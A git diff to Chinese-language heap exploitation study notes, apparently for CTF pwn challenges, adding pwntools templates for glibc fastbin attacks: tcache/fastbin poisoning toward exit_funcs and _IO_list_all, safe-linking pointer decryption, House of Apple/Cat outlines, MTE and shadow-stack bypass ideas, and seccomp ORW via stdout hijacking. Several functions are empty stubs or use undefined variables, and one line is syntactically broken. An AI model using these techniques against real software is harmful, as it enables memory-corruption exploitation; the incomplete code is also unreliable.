@@ -166,53 +166,264 @@ target = libc.symbols['__free_hook'] - 0x?  # 找合适的 size
 
 ## 2024-2026 新技术点
 
-### 1. glibc 2.34+ 无 hooks
+### 1. glibc 2.34+ 无 hooks Fastbin 利用
 
 ```python
-# 传统 __malloc_hook/__free_hook 失效
-# 新利用方法：
-# 1. IO_FILE 攻击（House of Apple 系列）
-# 2. exit_funcs 利用
-# 3. TLS 劫持
+# glibc 2.34+ 移除 __malloc_hook/__free_hook
+# Fastbin 攻击不再能直接覆盖 hook，需转向新目标
+
+from pwn import *
+
+context.arch = 'amd64'
+
+def fastbin_exploit_no_hooks():
+    """glibc 2.34+ fastbin 攻击模板"""
+    p = process('./pwn')
+    elf = ELF('./pwn')
+    libc = ELF('./libc.so.6')
+    
+    def malloc(size, idx=None):
+        p.sendlineafter(b'>', b'1')
+        p.sendlineafter(b'size:', str(size).encode())
+    
+    def free(idx):
+        p.sendlineafter(b'>', b'2')
+        p.sendlineafter(b'idx:', str(idx).encode())
+    
+    def edit(idx, data):
+        p.sendlineafter(b'>', b'3')
+        p.sendlineafter(b'idx:', str(idx).encode())
+        p.sendafter(b'data:', data)
+    
+    # === 方案 1：Fastbin -> tcache poisoning -> exit_funcs ===
+    # 将 fastbin chunk 分配到 tcache_perthread_struct 附近
+    # 修改 tcache fd 进行 poisoning
+    
+    # 分配 chunk 用于后续 fastbin attack
+    for i in range(7):
+        malloc(0x70)   # 填满 tcache
+    malloc(0x70)       # idx 7，进入 fastbin
+    malloc(0x20)       # idx 8，guard chunk
+    
+    # 释放 7 个填满 tcache
+    for i in range(7):
+        free(i)
+    # 释放 idx 7 进入 fastbin
+    free(7)
+    
+    # 泄露 fastbin fd（已释放 chunk 的 fd 值）
+    # 在 safe-linking 之前 (glibc < 2.32)：直接得到 next chunk 地址
+    # 在 safe-linking 之后 (glibc 2.32+)：需要解密
+    
+    # 修改 fastbin fd 指向目标
+    target = exit_funcs_addr  # 或其他目标
+    edit(7, p64(target))
+    
+    # 清空 tcache，再分配两次
+    for i in range(7):
+        malloc(0x70)
+    malloc(0x70)  # 返回原 chunk
+    malloc(0x70)  # 返回 target
+    # 此时可以写入 target
+    
+    # === 方案 2：Fastbin -> _IO_list_all ===
+    # 将 fastbin chunk 分配到 _IO_list_all 附近
+    # 构造 fake IO_FILE
+    
+    p.interactive()
 ```
 
-### 2. safe-linking
+### 2. safe-linking 绕过 (glibc 2.32+)
 
 ```python
-# glibc 2.32+
-# fastbin 指针加密
-# 需要泄露堆地址
+# glibc 2.32+ fastbin fd 加密：encrypted = (chunk_addr >> 12) ^ next_ptr
+
+from pwn import *
+
+context.arch = 'amd64'
+
+class FastbinSafeLinking:
+    """fastbin safe-linking 绕过工具"""
+    
+    @staticmethod
+    def encrypt_fd(chunk_addr, next_ptr):
+        return (chunk_addr >> 12) ^ next_ptr
+    
+    @staticmethod
+    def decrypt_fd(chunk_addr, encrypted):
+        return (chunk_addr >> 12) ^ encrypted
+    
+    @staticmethod
+    def leak_heap_from_last_fastbin(encrypted_fd):
+        """从 fastbin 末尾 chunk 的加密 fd 泄露堆地址"""
+        # 末尾 chunk 的 next 是 NULL
+        return encrypted_fd << 12
+
+def bypass_fastbin_safe_linking(p, malloc, free, edit):
+    """绕过 fastbin safe-linking"""
+    # Step 1：泄露堆地址
+    # 分配足够多 chunk 确保 fastbin 不为空
+    for i in range(7):
+        malloc(0x70)
+    malloc(0x70)  # idx 7
+    malloc(0x20)  # guard
+    
+    for i in range(7):
+        free(i)
+    free(7)  # 进入 fastbin
+    
+    # 读取 fastbin 上的加密 fd
+    # 由于 fastbin LIFO，idx 7 的 fd 指向 tcache 中最后一个 chunk
+    # 需要选择合适的 chunk 来泄露
+    
+    # 更简单的方法：从 tcache 泄露堆地址
+    # tcache 也有 safe-linking
+    malloc(0x30)  # idx 0
+    malloc(0x30)  # idx 1
+    free(0)
+    free(1)
+    # 读取 idx 1 的加密 fd
+    # encrypted = (idx1_addr >> 12) ^ idx0_addr
+    # idx0 的 next = NULL (tcache 末尾)
+    # encrypted_idx0 = (idx0_addr >> 12) ^ 0 = idx0_addr >> 12
+    
+    # 如果 idx0 是 tcache 最后一个：encrypted = (idx0_addr >> 12) ^ 0
+    # heap = encrypted << 12
+    
+    # Step 2：构造加密 fd
+    target = 0x404000
+    chunk_addr = heap_base + 0x300
+    encrypted = FastbinSafeLinking.encrypt_fd(chunk_addr, target)
+    edit(idx, p64(encrypted))
+    
+    # Step 3：分配得到 target
+    malloc(0x70)  # 清 tcache
+    # ... 清完后分配 fastbin
 ```
 
-### 3. House of Apple 系列
+### 3. House of Apple 系列 + Fastbin
 
 ```python
-# House of Apple 2/3
-# 针对 glibc 2.34+
-# 通过 fastbin + IO_FILE 实现 RCE
+# 利用 fastbin attack 分配到 IO_FILE 相关结构
+
+from pwn import *
+
+context.arch = 'amd64'
+
+def fastbin_to_io_file():
+    """
+    Fastbin attack -> _IO_list_all -> fake IO_FILE
+    步骤：
+    1. 通过 fastbin attack 分配到 _IO_list_all 附近
+    2. 覆盖 _IO_list_all
+    3. 伪造 fake IO_FILE (House of Apple 2/3)
+    4. 触发 _IO_flush_all_lockp
+    """
+    pass
+
+def fastbin_to_exit_funcs():
+    """
+    Fastbin attack -> __exit_funcs -> RCE
+    步骤：
+    1. 通过 fastbin attack 分配到 __exit_funcs
+    2. 覆盖 __exit_funcs 指向伪造的 exit_function_list
+    3. 触发 exit()
+    """
+    pass
 ```
 
-### 4. House of Cat
+### 4. House of Cat (Fastbin 部分)
 
 ```python
-# 2024 年新利用链
-# 针对 glibc 2.35+
+# House of Cat 中 fastbin 的角色
+# fastbin -> largebin -> _IO_list_all -> fake IO_FILE
+
+from pwn import *
+
+context.arch = 'amd64'
+
+def house_of_cat_fastbin_component():
+    """
+    House of Cat 利用链中 fastbin 的作用：
+    1. fastbin 用于获取初始的任意写能力
+    2. 配合 largebin attack 修改 _IO_list_all
+    3. 构造 fake IO_FILE 触发代码执行
+    
+    与纯 fastbin attack 的区别：
+    - 需要更多步骤
+    - 适用于 glibc 2.35+ 无 hooks 场景
+    - 支持 seccomp (ORW)
+    """
+    pass
 ```
 
-### 5. 硬件级防护
+### 5. 硬件级防护绕过
 
 ```python
-# Intel CET
-# ARM PAC/BTI
-# MTE (Memory Tagging Extension)
-# 影响 fastbin 利用
+# Intel CET / ARM PAC+BTI / MTE 对 fastbin 利用的影响
+
+from pwn import *
+
+def hardware_bypass_fastbin():
+    """硬件防护下 fastbin 利用的调整"""
+    
+    # === MTE 下的 fastbin ===
+    # MTE 给每个堆块分配 tag
+    # fastbin poisoning 分配到目标时，tag 必须匹配
+    
+    def mte_fastbin_bypass():
+        """MTE 绕过思路"""
+        # 1. Tag spraying：大量分配，等待 tag 重复
+        # 2. 部分覆盖：修改 fd 低位，保留高位 tag
+        # 3. 线程利用：不同线程的 tag 分配可能不同
+        pass
+    
+    # === Shadow Stack 下的 fastbin ===
+    # fastbin 攻击覆盖返回地址时，影子栈会检测
+    
+    def shadow_stack_fastbin_bypass():
+        """影子栈绕过思路"""
+        # 1. 不覆盖返回地址，改用其他控制流
+        # 2. 利用 longjmp/setjmp 绕过
+        # 3. 覆盖影子栈本身（如果可以访问）
+        pass
 ```
 
-### 6. 沙箱环境
+### 6. 沙箱环境 Fastbin 利用
 
 ```python
-# seccomp 限制
-# 通过 ORW (open/read/write) 绕过
+# seccomp 限制下的 fastbin 攻击
+
+from pwn import *
+
+context.arch = 'amd64'
+
+def fastbin_orw():
+    """fastbin 攻击实现 ORW"""
+    p = process('./pwn')
+    libc = ELF('./libc.so.6')
+    
+    # 1. Fastbin poisoning 获取任意写
+    # 2. 覆盖 _IO_write_base / _IO_write_ptr
+    #    控制 stdout 输出任意内存
+    # 3. 泄露 flag 内容
+    # 或
+    # 2. 覆盖 exit_funcs
+    # 3. 构造 ORW ROP 链
+    # 4. 触发 exit 执行
+    
+    # stdout 劫持技巧（glibc 2.34+）：
+    # 覆盖 _IO_2_1_stdout_ 的 _IO_write_base
+    # 设置为低地址，让 _IO_write_ptr 为高地址
+    # printf 时会输出 _IO_write_base 到 _IO_write_ptr 之间的内容
+    # 从而泄露 libc / 堆 / 栈地址
+    
+    stdout_addr = libc_base + libc.symbols['_IO_2_1_stdout_']
+    # fake _IO_write_base = stdout_addr + 0x20 (低地址)
+    # fake _IO_write_ptr = libc_base + 0x (高地址，待泄露的区域)
+    # 程序下次调用 printf 时会输出该区域
+    
+    p.interactive()
 ```
 
 ## 工具推荐
